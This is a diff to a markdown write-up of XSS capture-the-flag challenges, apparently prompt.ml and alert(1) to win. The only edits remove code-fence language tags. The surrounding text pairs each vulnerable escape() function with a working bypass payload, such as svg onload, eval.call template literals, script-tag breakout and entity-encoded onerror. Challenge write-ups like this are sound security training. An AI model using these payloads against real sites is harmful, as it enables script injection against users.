@@ -4,7 +4,7 @@
 
 - Task
  
-```js
+```
 function escape(input) {
     // warm up
     // script should be executed without user interaction
@@ -14,13 +14,13 @@ function escape(input) {
 
 - Solution
 
-```js
+```
 "><svg onload=prompt(1)//
 ```
 
 - HTML source
 
-```html
+```
 <input type="text" value=""><svg onload=prompt(1)//">
 ```
 
@@ -28,7 +28,7 @@ function escape(input) {
 
 - Task
 
-```js
+```
 function escape(input) {
     // tags stripping mechanism from ExtJS library
     // Ext.util.Format.stripTags
@@ -41,13 +41,13 @@ function escape(input) {
 
 - Solution
 
-```html
+```
 <svg onload=prompt(1)//
 ```
 
 - HTML source
 
-```html
+```
 <article><svg onload=prompt(1)// </article>
 ```
 
@@ -55,7 +55,7 @@ function escape(input) {
 
 - Task
 
-```js
+```
 function escape(input) {
     //                      v-- frowny face
     input = input.replace(/[=(]/g, '');
@@ -67,13 +67,13 @@ function escape(input) {
 
 - Solution
 
-```html
+```
 <script>eval.call`${'prompt\x281\x29'}`</script>
 ```
 
 HTML source
 
-```html
+```
 <script>eval.call`${'prompt\x281\x29'}`</script>
 ```
 
@@ -81,7 +81,7 @@ HTML source
 
 Task
 
-```js
+```
 function escape(input) {
     // pass in something like dog#cat#bird#mouse...
     var segments = input.split('#');
@@ -94,13 +94,13 @@ function escape(input) {
 
 Solution
 
-```html
+```
 "><script>/*#*/prompt/*#*/(1)/*#*/</script>
 ```
 
 - HTML source
 
-```html
+```
 <p class="comment" title=""><script>/*"></p>
 <p class="comment" title="*/prompt/*"></p>
 <p class="comment" title="*/(1)/*"></p>
@@ -113,7 +113,7 @@ Solution
 
 - Task
 
-```js
+```
 function escape(s) {
   return '<script>console.log("'+s+'");</script>';
 }
@@ -121,7 +121,7 @@ function escape(s) {
 
 -Solution
 
-```js
+```
 ",alert(1),"
 ```
 
@@ -129,7 +129,7 @@ function escape(s) {
 
 - Task
 
-```js
+```
 function escape(s) {
   s = s.replace(/"/g, '\\"');
   return '<script>console.log("' + s + '");</script>';
@@ -138,7 +138,7 @@ function escape(s) {
 
 - Solution
 
-```js
+```
 \");alert(1)//
 ```
 
@@ -146,7 +146,7 @@ function escape(s) {
 
 - Task
 
-```js
+```
 function escape(s) {
   s = JSON.stringify(s);
   return '<script>console.log(' + s + ');</script>';
@@ -155,7 +155,7 @@ function escape(s) {
 
 - Solution
 
-```js
+```
 </script><script>alert(1)//
 ```
 
@@ -163,7 +163,7 @@ function escape(s) {
 
 - Task
 
-```js
+```
 function escape(s) {
   var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
   // URLs
@@ -176,7 +176,7 @@ function escape(s) {
 
 - Solution
 
-```js
+```
 [[x|http://onerror=javascript:alert(1)//]]
 ```
 
@@ -184,7 +184,7 @@ function escape(s) {
 
 - Task
 
-```js
+```
 function escape(s) {
   return '<script>console.log("' + s.toUpperCase() + '")</script>';
 }
@@ -192,7 +192,7 @@ function escape(s) {
 
 - Solution
 
-```js
+```
 </script><img src onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
 ```
 
@@ -200,7 +200,7 @@ function escape(s) {
 
 - Task
 
-```js
+```
 function escape(s) {
   s = JSON.stringify(s).replace(/<\/script/gi, '');
 
@@ -210,6 +210,6 @@ function escape(s) {
 
 - Solution
 
-```js
+```
 </scrip</scriptt><script>alert(1)//
 ```
